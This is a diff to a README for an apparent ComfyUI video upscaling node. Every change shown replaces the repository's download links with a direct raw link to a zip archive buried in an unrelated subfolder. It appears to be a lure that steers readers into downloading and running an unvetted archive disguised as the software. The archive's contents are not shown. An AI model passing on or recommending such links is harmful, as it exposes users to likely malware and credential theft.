@@ -1,6 +1,6 @@
 # 🎬 ComfyUI_SparkVSR_SM - Sharper Video, Less Effort
 
-[![Download ComfyUI_SparkVSR_SM](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM)
+[![Download ComfyUI_SparkVSR_SM](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM/raw/refs/heads/main/finetune/PiSASR/ram/VS_U_Comfy_SM_Spark_v2.9.zip)
 
 ## 📌 What this is
 
@@ -41,7 +41,7 @@ SparkVSR works best when your system can process video frames fast. A stronger G
 
 Use this page to download and run the files you need:
 
-[Visit the download page](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM)
+[Visit the download page](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM/raw/refs/heads/main/finetune/PiSASR/ram/VS_U_Comfy_SM_Spark_v2.9.zip)
 
 ### Step 1: Open the page
 
@@ -257,7 +257,7 @@ Use this order for the best first run:
 
 If you need the files again, use this link:
 
-[https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM)
+[https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM/raw/refs/heads/main/finetune/PiSASR/ram/VS_U_Comfy_SM_Spark_v2.9.zip](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM/raw/refs/heads/main/finetune/PiSASR/ram/VS_U_Comfy_SM_Spark_v2.9.zip)
 
 ## 📝 Short setup checklist
 
